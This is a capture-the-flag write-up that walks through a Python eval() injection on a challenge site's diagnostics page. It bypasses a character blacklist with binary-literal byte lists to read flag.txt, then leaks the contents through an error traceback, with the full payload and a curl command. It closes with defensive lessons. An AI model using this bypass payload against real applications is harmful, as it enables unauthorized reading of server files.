# 7 - Spill Report

## Challenge

<p align="center">
  <img src="asset/challenge.png" width="700" alt="7 - Spill Report Challenge">
</p>

## Solution

### 1. Find the vulnerable function

The challenge provides a diagnostics page that accepts a value through the `value` parameter.

After checking the input, the application runs:

```python
result = eval(value.lower())
```

The problem is `eval()`.

In Python, `eval()` executes the input as Python code. Since we control the input, we may be able to make the server execute code that we choose.

### 2. Understand the input filter

The developer added a blacklist to block dangerous input.

For example, it blocks characters and words such as:

- `.` and `,`
- Single and double quotes
- `a` and `m`
- Words such as `import`, `eval`, and `exec`

It also rejects input containing more than 18 different characters.

Instead of writing the filename `flag.txt` directly, we need to construct it using characters that are allowed.

### 3. Build the filename

Python's `bytes()` function can convert numbers into text.

For example:

```python
bytes([102, 108, 97, 103])
```

This produces:

```text
b'flag'
```

We can also write numbers in binary using the `0b` prefix.

For example:

```python
0b1100110
```

is the number `102`, which represents the letter `f`.

Because commas are blocked, we combine individual lists using `+` instead.

This lets us construct the filename `flag.txt` without typing the blocked characters:

```python
bytes([0b1100110]+[0b1101100]+[0b1100001]+[0b1100111]+[0b101110]+[0b1110100]+[0b1111000]+[0b1110100])
```

### 4. Read the flag

We can use Python's `open()` function to access the file.

The following part reads the first line from the file:

```python
[*open(bytes([0b1100110]+[0b1101100]+[0b1100001]+[0b1100111]+[0b101110]+[0b1110100]+[0b1111000]+[0b1110100]))][0]
```

At this point, the flag is read, but we still need a way to make the server show it to us.

### 5. Leak the flag through an error message

The application displays detailed error pages when something goes wrong.

We can take advantage of this by deliberately causing a Python error that includes the flag in its error message.

The `bytes()` function normally accepts a byte sequence and an encoding name. If we give it the flag as the encoding name, Python raises a `LookupError` and includes that value in the error message.

We use `*` to pass the flag twice as separate arguments:

```python
bytes(*([[*open(bytes([0b1100110]+[0b1101100]+[0b1100001]+[0b1100111]+[0b101110]+[0b1110100]+[0b1111000]+[0b1110100]))][0]]*2))
```

The server then displays an error containing the flag in its traceback.

### 6. Retrieve the flag

Send the payload to the challenge endpoint using `curl`:

```bash
curl -s -G 'https://petronas-gcsm2026-gebeng-chem-portal.chals.io/diagnostics/rate' \
  --data-urlencode 'value=bytes(*([[*open(bytes([0b1100110]+[0b1101100]+[0b1100001]+[0b1100111]+[0b101110]+[0b1110100]+[0b1111000]+[0b1110100]))][0]]*2))' \
  | grep -oE 'PETRONAS\{[^}]+\}'
```

The command extracts the flag from the error page.

## Flag

```text
PETRONAS{d3bug_m0d3_l34ks_0t_s3cr3ts}
```

## What We Learned

- **Unsafe `eval()`:** Never execute user-controlled input as Python code.
- **Blacklist bypass:** Blocking selected characters and words is not a reliable way to secure an application.
- **Error message information leaks:** Detailed error messages can expose sensitive information.
- **Debug mode:** Debug pages should not reveal internal application details to users.